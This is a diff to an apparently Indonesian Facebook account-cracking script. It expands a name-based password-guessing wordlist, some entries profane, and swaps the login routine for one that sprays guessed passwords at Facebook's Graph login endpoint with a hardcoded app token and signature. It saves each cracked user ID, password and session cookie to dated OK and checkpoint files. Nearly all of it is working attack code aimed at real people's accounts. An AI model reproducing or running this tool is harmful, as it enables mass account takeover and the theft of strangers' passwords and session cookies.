@@ -337,6 +337,7 @@ thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 hour = datetime.datetime.now().hour
+hari_ini = datetime.datetime.now().strftime("%d-%B-%Y")
 #--> Pengkondisian Jam Untuk Salam Harian
 if hour < 4:
   hhl = f"Selamat Dini Hari"
@@ -1031,108 +1032,167 @@ def setting():
     else:
         ualuh.append('tidak')
     passwrd()
+    
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	global prog,des
-	bi = random.choice([u,k,kk,b,h,hh])
-	print('')
-	urut = []
-	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=40,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
-	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=40,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
-	wa.print(Columns(urut))
-	awal = datetime.now()
-	Console().print(Panel(f'\t[bold yellow]hidup/matikan Mode Pesawat Setiap 5 menit',title=f"[bold green]Informasi",width=80,style=f"{color_panel}"))
-	prog = Progress(TextColumn('{task.description}'))
-	des = prog.add_task('',total=len(id2))
-	with prog:
-		with tred(max_workers=30) as pool:
-			for yuzong in id2:
-				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-				frs = nmf.split(" ")[0]
-				pwv = ['anjing123','bangsad123','sayangku','maling123','sayang123','malang123','bismillah123']
-				if len(nmf)<6:
-					if len(frs)<3:
-						pass
-					else:
-						pwv.append(nmf)
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
-						pwv.append(frs+'12345')
-						pwv.append(frs+'123456')
-						pwv.append(frs+'1234567')
-				else:
-					if len(frs)<3:
-						pwv.append(nmf)
-					else:
-						pwv.append(nmf)
-						pwv.append(frs+'12')
-						pwv.append(frs+'321')
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
-						pwv.append(frs+'12345')
-						pwv.append(frs+'123456')
-						pwv.append(frs+'1234567')
-				if 'ya' in pwpluss: 
-					for xpwd in pwnya:
-						pwv.append(xpwd)
-				else:pass
-				pool.submit(reguler,idf,pwv,awal)
-				
-		print('')
-	Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
-	Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
-	Console().print(Panel(' [bold green]Lanjut Crack Kembali ?  Y/T  ',width=80,style=f"{color_panel}"))
-	li = console.input(f" {H2}• {P2}pilih : ")
-	if li in ['Y','y']:
-		back()
-	else:
-		Console().print(f"[bold green]	\n[bold yellow]God Bye Kawan")
-		time.sleep(1)
-		exit()
+    global prog,des
+    bi = random.choice([u,k,kk,b,h,hh])
+    print('')
+    urut = []
+    urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=40,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
+    urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=40,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
+    wa.print(Columns(urut))
+    awal = datetime.now()
+    Console().print(Panel(f'\t[bold yellow]hidup/matikan Mode Pesawat Setiap 5 menit',title=f"[bold green]Informasi",width=80,style=f"{color_panel}"))
+    prog = Progress(TextColumn('{task.description}'))
+    des = prog.add_task('',total=len(id2))
+    with prog:
+        with tred(max_workers=30) as pool:
+            for yuzong in id2:
+                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+                frs = nmf.split(" ")[0]
+                pwv = ['anjing123','bangsad123','sayangku','maling123','sayang123','malang123','bismillah123']
+                if len(nmf)<6:
+                    if len(frs)<3:
+                        pass
+                    else:
+                        pwv.append(frs+"123")
+                        pwv.append(frs+"321")
+                        pwv.append(frs+"1234")
+                        pwv.append(frs+"12345")
+                        pwv.append("ganteng")
+                        pwv.append("sayangku")
+                        pwv.append("ganteng123")
+                        pwv.append("katasandi")
+                        pwv.append("freefire")
+                        pwv.append("freefire123")
+                else:
+                    if len(frs)<3:
+                        pwv.append(nmf)
+                        pwv.append(nmf+"123")
+                        pwv.append(nmf+"321")
+                    else:
+                        pwv.append(nmf)
+                        pwv.append(frs+"123")
+                        pwv.append(frs+"321")
+                        pwv.append(frs+"1234")
+                        pwv.append(frs+"12345")
+                        pwv.append("kata sandi")
+                        pwv.append("free fire")
+                        pwv.append("free fire123")
+                    belakang = nmf.split(" ")[1]
+                    if len(belakang)<3:
+                        pwv.append(frs+belakang)
+                        pwv.append(frs+belakang+"123")
+                        pwv.append(frs+belakang+"321")
+                        pwv.append(frs+belakang+"1234")
+                        pwv.append(frs+belakang+"12345")
+                    else:
+                        pwv.append(frs+belakang)
+                        pwv.append(belakang+"123")
+                        pwv.append(belakang+"321")
+                        pwv.append(belakang+"1234")
+                        pwv.append(belakang+"12345")
+                        pwv.append("kontol")
+                        pwv.append("kontol123")
+                        pwv.append("bismillah")
+                        pwv.append("mobile legends")
+                        pwv.append("domino123")
+                if 'ya' in pwpluss: 
+                    for xpwd in pwnya:
+                        pwv.append(xpwd)
+                else:pass
+                pool.submit(reguler,idf,pwv,awal)
+                
+        print('')
+    Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
+    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
+    Console().print(Panel(' [bold green]Lanjut Crack Kembali ?  Y/T  ',width=80,style=f"{color_panel}"))
+    li = console.input(f" {H2}• {P2}pilih : ")
+    if li in ['Y','y']:
+        back()
+    else:
+        Console().print(f"[bold green]	\n[bold green]God Bye Kawan")
+        time.sleep(1)
+        exit()
 
 
 #--------------------[ METODE-MOBILE ]-----------------#
-def crack(idf,pwv):
-	global loop,ok,cp
-	bi = random.choice(['\33[m'])
-	pers = loop*100/len(id2)
-	fff = '%'
-	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
-	prog.advance(des)
-	rr = random.randint
-	Xshin = [f'Mozilla/5.0 (Linux; Android {str(rr(1,14))}; SM-G780G Build/SP1A.210812.016; wv)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(77,150))}.0{str(rr(4000,4280))}.{str(rr(70,199))} Mobile Safari/537.36[FB_IAB/FB4A; FBAV/397.0.0.23.404;']
-	ua = random.choice(Xshin)
-	ses = requests.Session()
-	for pw in pwv:
-		try:
-			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1138256180423492&kid_directed_site=0&app_id=1138256180423492&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D1138256180423492%26display%3Dpage%26redirect_uri%3Dhttps%253A%252F%252Faccounts.shopify.com%252Flogin%252Fexternal%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3Dc2f75de03d88da0a9d730aba318d12dd6bc357b6d7798530%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De0590b7c-c4cc-4b66-b419-14083139e4c3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.shopify.com%2Flogin%2Fexternal%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dc2f75de03d88da0a9d730aba318d12dd6bc357b6d7798530%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v13.0/dialog/oauth?app_id=799063067916842&cbt=1697315405849&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df107332bd16fa34%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener&client_id=799063067916842&display=touch&domain=www.digimap.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.digimap.co.id%2Flogin&locale=en_US&logger_id=f81df0319ce4dc&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df34290959a6d4cc%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener%26frame%3Df34154227dfa4&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&version=v13.0&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
-			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=799063067916842&kid_directed_site=0&app_id=799063067916842&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D799063067916842%26cbt%3D1697315405849%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df107332bd16fa34%2526domain%253Dwww.digimap.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.digimap.co.id%25252Ff9dddded8d1374%2526relation%253Dopener%26client_id%3D799063067916842%26display%3Dtouch%26domain%3Dwww.digimap.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Flogin%26locale%3Den_US%26logger_id%3Df81df0319ce4dc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df34290959a6d4cc%2526domain%253Dwww.digimap.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.digimap.co.id%25252Ff9dddded8d1374%2526relation%253Dopener%2526frame%253Df34154227dfa4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv13.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df34290959a6d4cc%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener%26frame%3Df34154227dfa4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
-			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'{K}   Rudal {cpc}')
-				print(f'\râ”œâ”€â”€{K}{idf}|{pw}    \n{M}{ua}           \n')
-				open('CP/'+cpc,'a').write(idf+' â€¢ '+pw+'\n')
-				akun.append(idf+' â€¢ '+pw)
-				cp+=1
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'{H}   Rudal {okc}')
-				print(f'\râ”œâ”€â”€ {H}{idf}|{pw} \n{P}â””â”€â”€ {H}{kuki}\n{H}{ua}{P}\n')
-				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
-				break
-				
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
+    
+def api(idf,pwv,awal):
+    global loop,ok,cp
+    rr = random.randint
+    Rudal = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
+    ahir = str(datetime.now()-awal).split('.')[0]
+    prog.update(des,description=f"{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.advance(des)
+    rudalll = [f'Mozilla/5.0 (Linux; Android {str(rr(1,14))}; SM-G780G Build/SP1A.210812.016; wv)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(77,150))}.0{str(rr(4000,4280))}.{str(rr(70,199))} Mobile Safari/537.36[FB_IAB/FB4A; FBAV/397.0.0.23.404;']
+    ses = requests.Session()
+    try:
+        if 'ya' in ualuh: ua = ualu[0]
+        for pw in pwv:
+            pw = pw.lower()
+            pw = pw.lower()
+            ua = random.choice(ugent)
+            ua = random.choice(free)
+            params = {
+					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
+					"sdk_version": {random.randint(1,26)}, 
+					"email": idf,
+					"locale": "en_US",
+					"password": pw,
+					"sdk": "android",
+					"generate_session_cookies": "1",
+					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+				}
+            headers = {
+					"Host": "graph.facebook.com",
+					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
+					"x-fb-sim-hni": str(random.randint(20000, 40000)),
+					"x-fb-net-hni": str(random.randint(20000, 40000)),
+					"x-fb-connection-quality": "EXCELLENT",
+					"user-agent": ua,
+					"content-type": "application/x-www-form-urlencoded",
+					"x-fb-http-engine": "Liger"
+				}
+            post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
+            if "session_key" in post.text and "EAA" in post.text:
+                coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
+                user = re.findall("c_user=(\d+)",coki)[0]
+                if user in ok or user in cp:
+                    break
+                else:
+                    ok.append(user)
+                    tree = Tree(" ",guide_style=f"{color_ok}")
+                    tree.add(Panel(f"{H2}       Succes-Login{P2}",width=30,padding=(0,2),style=f"{color_ok}"))
+                    tree.add(f"\r{P2}User ID {P2}  : {H2}{user}")
+                    tree.add(f"{P2}Password {P2} : {H2}{pw}")
+                    tree.add(Panel(f"{H2}{coki}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
+                    tree.add(Panel(f"{H2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
+                    prints(tree)
+                    open(f"OK/{hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\n")
+                    break
+            elif "User must verify their account" in post.text:
+                user = post.json()["error"]["error_data"]["uid"]
+                if user in ok or user in cp:
+                    break
+                else:
+                    cp.append(user)
+                    tree = Tree(" ",guide_style=f"{color_cp}")
+                    tree.add(Panel(f"{K2}   Checkpoint-Login{P2}",width=30,padding=(0,2),style=f"{color_cp}"))
+                    tree.add(f"\r{P2}User ID {P2}     : {K2}{user}")
+                    tree.add(f"{P2}Password {P2}    : {K2}{pw}")
+                    tree.add(Panel(f"{K2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_cp}"))
+                    prints(tree)
+                    open(f"CP/{hari_ini}.txt","a").write(f"{user}|{pw}\n")
+                    break
+            elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
+                prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(loop)}/{len(id)} OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}")
+                prog.advance(des)
+                time.sleep(30)
+            else:continue
+    except requests.exceptions.ConnectionError:time.sleep(30)
+loop+=1
 #--------------------[ METODE reguler ]-----------------#
 def reguler(idf,pwv,awal):
 	global loop,ok,cp
